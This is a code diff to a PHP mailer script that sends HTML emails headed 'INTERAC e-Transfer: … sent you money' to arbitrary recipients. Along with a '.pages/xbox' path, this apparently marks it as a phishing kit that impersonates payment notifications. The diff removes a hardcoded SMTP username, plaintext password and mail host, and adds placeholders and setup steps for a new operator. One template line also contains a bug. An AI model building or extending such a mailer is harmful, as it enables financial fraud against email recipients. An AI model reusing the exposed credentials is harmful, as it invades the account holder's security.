@@ -7,7 +7,7 @@ require ("PHPMailer/src/PHPMailer.php");
 require ("PHPMailer/src/SMTP.php");
 require ("PHPMailer/src/Exception.php");
 
-$template = file_get_contents('CancelNotice1.html');
+$template = file_get_contents('email_template1.html');
 $message = str_replace('{{expiredate}}', $_POST['expiredate'], $template);
 $message = str_replace('{{username}}', $_POST['username'], $template);
 $message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
@@ -32,7 +32,7 @@ $mail->Body = $message; // use $message instead of $template
 $mail->SMTPAuth = true; 
 $mail->Username = $_POST['username']; 
 $mail->Password = $_POST['password']; 
-$mail->SetFrom('triplex@gpnet.ca', $_POST['sender_name']); 
+$mail->SetFrom('<YOUR-SMTP-EMAIL>', $_POST['sender_name']); 
 $mail->AddAddress($_POST['receiver_email']); 
 $mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
 $mail->IsHTML(true); 
@@ -354,10 +354,13 @@ h1:focus {
     </style>
   </select><input type="submit" value="Submit">
 
-<center>DONT EDIT THIS </center>
-<input type="hidden"       name="port"     value="587"              required>
-<input type="hidden"       name="username"   value="triplex@gpnet.ca" required>
-<input type="hidden"   name="password" value="Triplex2020!"     required>
-<input type="hidden"       name="host"     value="mail.gpnet.ca"    required>
+<center>EDIT THIS SECTION" OPEN submit.php inside .pages/xbox/submit \n
+	THEN CHANGE THE INPUT TYPES TO HIDDEN AND THEN SAVE,\n
+	RESTART SERVER </center>
+	
+<input type="text"       name="port"     placeholder="<PORT-NUMBER>"              required>
+<input type="email"      name="username" placeholder="<your-smtp-email>"          required>
+<input type="text"       name="password" placeholder="<your-smtp-passsword"       required>
+<input type="smtp"       name="host"     placeholder="<MAIL-HOSTING-URL>"         required>
 </body></html>
 
